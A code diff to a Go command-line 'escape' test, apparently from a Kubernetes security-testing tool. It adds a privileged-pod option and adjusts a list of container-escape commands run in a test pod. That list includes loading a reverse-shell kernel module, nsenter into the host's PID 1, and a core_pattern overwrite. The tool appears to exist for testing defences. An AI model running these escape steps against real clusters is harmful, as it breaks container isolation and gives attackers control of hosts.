@@ -19,6 +19,7 @@ var (
 	image      string
 	timeout    time.Duration
 	stopper    bool
+	privileged bool
 )
 
 func init() {
@@ -29,6 +30,7 @@ func init() {
 	escapeCmd.Flags().StringVarP(&image, "image", "i", "nicolaka/netshoot:latest", "image to use for test pod")
 	escapeCmd.Flags().DurationVarP(&timeout, "timeout", "t", 3*time.Minute, "overall timeout for the test")
 	escapeCmd.Flags().BoolVarP(&stopper, "stopper", "s", false, "waits for the user to press a key after each command is executed, allowing them to be executed step by step")
+	escapeCmd.Flags().BoolVar(&privileged, "privileged", false, "create privileged pod with (Privileged = true), (HostPID = true), (HostPath = '/hostroot'), (Caps = 'SYS_ADMIN', 'NET_ADMIN', 'SYS_PTRACE')")
 }
 
 var escapeCmd = &cobra.Command{
@@ -44,7 +46,7 @@ var escapeCmd = &cobra.Command{
 			{"id"},
 			{"uname", "-a"},
 			{"cat", "/proc/1/cgroup"},
-			{"cat", "/proc/self/status"},
+			{"/bin/sh", "-c", "cat /proc/self/status | grep -i cap"},
 			{"insmod", "/test/reverse_shell.ko"},
 			{"nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"},
 			{"mkdir", "-p", "/mnt/hostfs"},
@@ -53,10 +55,10 @@ var escapeCmd = &cobra.Command{
 			{"echo", "|$overlay/shell.sh", ">", "/proc/sys/kernel/core_pattern"},
 			{"ls", "/var/run/docker.socket"},
 			//GDB
-			{"cat", "/etc/mtab"},
+			{"/bin/sh", "-c", "cat /etc/mtab | head -n 10"},
 		}
 
-		results, err := app.ExecCommands(ctx, clientset, image, commands, cfg, namespace, stopper)
+		results, err := app.ExecCommands(ctx, clientset, image, commands, cfg, namespace, stopper, privileged)
 		if err != nil {
 			fmt.Println(err)
 		}
